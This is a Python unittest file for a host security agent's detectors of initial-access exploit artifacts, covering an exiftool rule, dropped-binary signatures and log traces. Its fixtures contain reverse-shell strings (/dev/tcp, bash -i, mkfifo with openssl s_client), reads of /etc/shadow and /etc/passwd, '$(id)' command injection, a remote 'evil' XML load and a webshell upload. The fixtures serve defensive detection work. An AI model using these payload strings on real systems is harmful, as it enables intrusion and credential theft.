#!/usr/bin/env python3
"""Initial-access exploit-artifact detection (VulnCheck IAC host-translations).

Covers the three P2 surfaces added in 1.13.0:
  A. the b-exiftool-shell BUILTIN_RULE (metadata-parser exploitation → shell);
  B. scan_data_for_ia_artifact — dropped exploit *binary* signatures (ELF reverse-shell .so,
     Fastjson gadget class, malicious MATLAB/HDF5), folded into the webshell content scan;
  C. scan_log_data_for_ia + IALogScanner — application-log exploit traces.

Signatures are host-translations of VulnCheck Initial Access Community detection content
(github.com/vulncheck-oss/initial-access-community, Apache-2.0). Pure stdlib. Run from the repo root:
  python3 -m unittest discover -s tests -v
"""
import base64
import os
import stat as _stat
import sys
import tempfile
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import agent  # noqa: E402


# ---- A. the exiftool rule -------------------------------------------------
class ExiftoolRule(unittest.TestCase):
    def test_rule_registered_and_described(self):
        ids = {r["id"] for r in agent.BUILTIN_RULES}
        self.assertIn("b-exiftool-shell", ids)
        self.assertIn("b-exiftool-shell", agent._BUILTIN_DESC)

    def test_rule_shape(self):
        r = next(r for r in agent.BUILTIN_RULES if r["id"] == "b-exiftool-shell")
        self.assertEqual(r["severity"], "critical")
        self.assertEqual(r["mitre"], "T1203")
        # ancestry+label, both required (match="all")
        self.assertEqual(r.get("match"), "all")
        fields = {c["field"] for c in r["conditions"]}
        self.assertEqual(fields, {"ancestry", "label"})


# ---- B. dropped exploit binary signatures ---------------------------------
class BinaryArtifacts(unittest.TestCase):
    def test_elf_reverse_shell_so_devtcp(self):
        data = (b"\x7fELF" + b"\x02\x01\x01" + b"\x00" * 9
                + b".init_array\x00system\x00fork\x00setsid\x00/dev/tcp/10.0.0.1/4444\x00bash -i\x00")
        m = agent.scan_data_for_ia_artifact(data)
        self.assertIsNotNone(m)
        self.assertEqual(m["cve"], "CVE-2026-33032")
        self.assertEqual(m["severity"], "critical")

    def test_elf_reverse_shell_so_mkfifo_variant(self):
        data = b"\x7fELF" + b"\x00" * 12 + b".init_array system fork setsid mkfifo openssl s_client"
        self.assertEqual(agent.scan_data_for_ia_artifact(data)["cve"], "CVE-2026-33032")

    def test_benign_elf_not_flagged(self):
        # has system/fork symbols (every libc-linked ELF does) but no .init_array tell + no rev-shell combo
        data = b"\x7fELF" + b"\x00" * 40 + b"system fork printf malloc getenv"
        self.assertIsNone(agent.scan_data_for_ia_artifact(data))

    def test_fastjson_gadget_class(self):
        data = (b"\xca\xfe\xba\xbe\x00\x00\x00\x34 jar:file:/proc/self/fd/ "
                b"Lcom/alibaba/fastjson/annotation/JSONType; RuntimeVisibleAnnotations ")
        self.assertEqual(agent.scan_data_for_ia_artifact(data)["cve"], "CVE-2026-16723")

    def test_plain_java_class_not_flagged(self):
        data = b"\xca\xfe\xba\xbe" + b"\x00" * 60 + b"java/lang/Object main"
        self.assertIsNone(agent.scan_data_for_ia_artifact(data))

    def test_matlab_hdf5_payload(self):
        data = b"MATLAB 5.0 MAT-file" + b"\x00" * (512 - 19) + b"\x89HDF\r\n\x1a\n" + b" x /etc/shadow y"
        self.assertEqual(agent.scan_data_for_ia_artifact(data)["cve"], "CVE-2026-66066")

    def test_benign_matlab_not_flagged(self):
        self.assertIsNone(agent.scan_data_for_ia_artifact(b"MATLAB 5.0 MAT-file" + b"\x00" * 600))

    def test_empty_and_text(self):
        self.assertIsNone(agent.scan_data_for_ia_artifact(b""))
        self.assertIsNone(agent.scan_data_for_ia_artifact(b"just some plain text, not a binary"))


# ---- C. application-log exploit traces ------------------------------------
_KID = base64.b64encode(
    b"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855").decode().encode()

LOG_CASES = [
    ("CVE-2025-8110", "gogs.log",
     b"2025/08/01 [ERROR] ...api/v1/repo/contents.go:123 PutContents() failed"),
    ("CVE-2026-61500", "access.log",
     b"POST /~/api/loginSrp1\n" * 6 + b"POST /~/api/_executeCommand\n"),
    ("CVE-2026-63030", "access.log",
     b"GET /wp-json/BATCH/V1?ACTION=UPLOAD-PLUGIN HTTP/1.1"),     # case-insensitive
    ("CVE-2026-63077", "teamcity-server.log",
     b"jetbrains.buildServer.agentServer.polling.Error.fromXml "
     b"com.thoughtworks.xstream.security.ForbiddenClassException "
     b"HSQLMetadataStorage$SchemaMismatchException"),
    ("CVE-2026-63077", "teamcity-server.log",
     b"jetbrains.buildServer.agentServer.polling.Error.fromXml "
     b"org.apache.commons.collections.keyvalue.TiedMapEntry "
     b"org.apache.commons.dbcp2.BasicDataSource"),
    ("CVE-2026-82329", "artifactory-request.log",
     b'{"alg":"RS256","kid":"' + _KID + b'"}'),
    ("CVE-2026-85706", "api_json.log",
     b'{"key":"file.path","value":"/etc/passwd"}'),
    ("CVE-2021-21315", "access.log",
     b"GET /api/getServices?name[]=$(id) HTTP/1.1"),
    ("CVE-2021-21315", "access_log",
     b"GET /api/getServices?name%5B%5D=%24%28id%29 HTTP/1.1"),
    ("CVE-2026-34197", "activemq.log",
     b"Establishing network connection from vm://localhost "
     b"DiscoveryNetworkConnector:NC:BrokerService[localhost] started\n"
     b"ERROR | Failed to load: URL [http://evil/x.xml]"),
    ("CVE-2026-73570", "maillog",
     b"improper command pipelining after VRFY\nService status change\n"
     b"changed from stopped to running"),
    ("CVE-2026-48939", "access.log",
     b"POST /index.php?option=com_icagenda jform[file]=shell.php HTTP/1.1"),
    ("CVE-2026-25939", "proxy.log",
     b'POST /api/projectData {"cmd":"x","set-script":"1","mode":"SERVER","parameters":"id"}'),
    ("CVE-2026-25939", "proxy.log",
     b'POST /api/scheduler {"action":"onRunScript","eventTrigger":"1","actoptions":{}}'),
]


class LogSignatures(unittest.TestCase):
    def test_every_signature_matches(self):
        for cve, fn, data in LOG_CASES:
            with self.subTest(cve=cve, fn=fn):
                m = agent.scan_log_data_for_ia(data, fn)
                self.assertIsNotNone(m, "%s expected a hit" % cve)
                self.assertEqual(m["cve"], cve)

    def test_hfs_requires_six_probes(self):
        # 3 SRP probes is below the count floor -> no match (anti-FP on a single probe)
        data = b"POST /~/api/loginSrp1\n" * 3 + b"POST /~/api/_executeCommand"
        self.assertIsNone(agent.scan_log_data_for_ia(data, "access.log"))

    def test_teamcity_sink_alone_not_flagged(self):
        data = b"jetbrains.buildServer.agentServer.polling.Error.fromXml ordinary line"
        self.assertIsNone(agent.scan_log_data_for_ia(data, "teamcity-server.log"))

    def test_gitlab_benign_file_path_not_flagged(self):
        data = b'{"key":"file.path","value":"/home/user/report.pdf"}'
        self.assertIsNone(agent.scan_log_data_for_ia(data, "api_json.log"))

    def test_file_gate(self):
        # Gogs tokens in a file whose name isn't gogs.log should not match the Gogs sig.
        data = b"[ERROR] api/v1/repo/contents.go: PutContents()"
        self.assertIsNone(agent.scan_log_data_for_ia(data, "syslog"))

    def test_empty(self):
        self.assertIsNone(agent.scan_log_data_for_ia(b"", "access.log"))

    def test_every_signature_has_required_fields(self):
        for sig in agent.IA_LOG_SIGNATURES:
            for k in ("cve", "name", "severity", "mitre", "any"):
                self.assertIn(k, sig)
            self.assertTrue(sig["any"], "%s has no groups" % sig["cve"])


class LogScannerCollector(unittest.TestCase):
    def test_scanner_flags_a_real_file(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "teamcity-server.log")
            with open(p, "wb") as f:
                f.write(b"boot\n" + LOG_CASES[3][2] + b"\nmore\n")
            sc = agent.IALogScanner(enabled=True, files=(p,), globs=())
            sc._collect()
            nodes = sc.snapshot()
            self.assertEqual(len(nodes), 1)
            n = nodes[0]
            self.assertEqual(n["type"], "file")
            self.assertEqual(n["detail"]["category"], "ia-log")
            self.assertEqual(n["detail"]["cve"], "CVE-2026-63077")
            self.assertEqual(n["severity"], "critical")
            self.assertTrue(n["id"].startswith("ia-log:CVE-2026-63077:"))

    def test_scanner_tails_large_file(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "access.log")
            with open(p, "wb") as f:
                f.write(b"x" * (agent.IA_LOG_MAX_TAIL + 5000))     # filler before the tail
                f.write(b"\n" + LOG_CASES[7][2] + b"\n")           # systeminformation injection in the tail
            sc = agent.IALogScanner(enabled=True, files=(p,), globs=())
            sc._collect()
            self.assertEqual(len(sc.snapshot()), 1)
            self.assertEqual(sc.snapshot()[0]["detail"]["cve"], "CVE-2021-21315")

    def test_scanner_clean_file_no_flags(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "access.log")
            with open(p, "wb") as f:
                f.write(b"127.0.0.1 - - [01/Aug/2025] \"GET /index.html HTTP/1.1\" 200 1234\n" * 50)
            sc = agent.IALogScanner(enabled=True, files=(p,), globs=())
            sc._collect()
            self.assertEqual(sc.snapshot(), [])
            self.assertEqual(sc.summary()["enabled"], True)
            self.assertEqual(sc.summary()["flagged"], 0)

    def test_disabled_scanner_summary(self):
        sc = agent.IALogScanner(enabled=False)
        sc.start()   # no-op when disabled
        self.assertFalse(sc.started)


class WebshellScannerIAHook(unittest.TestCase):
    def test_dropped_elf_so_flagged_in_drop_zone(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "libhelper.so")
            with open(p, "wb") as f:
                f.write(b"\x7fELF" + b"\x00" * 12
                        + b".init_array system fork setsid /dev/tcp/1.2.3.4/9/ bash -i")
            sc = agent.WebshellScanner(enabled=True, dirs=(d,), webroots=())
            sc._collect()
            nodes = [n for n in sc.snapshot() if n["detail"].get("category") == "ia-artifact"]
            self.assertEqual(len(nodes), 1)
            self.assertEqual(nodes[0]["detail"]["cve"], "CVE-2026-33032")
            self.assertEqual(nodes[0]["severity"], "critical")


if __name__ == "__main__":
    unittest.main()
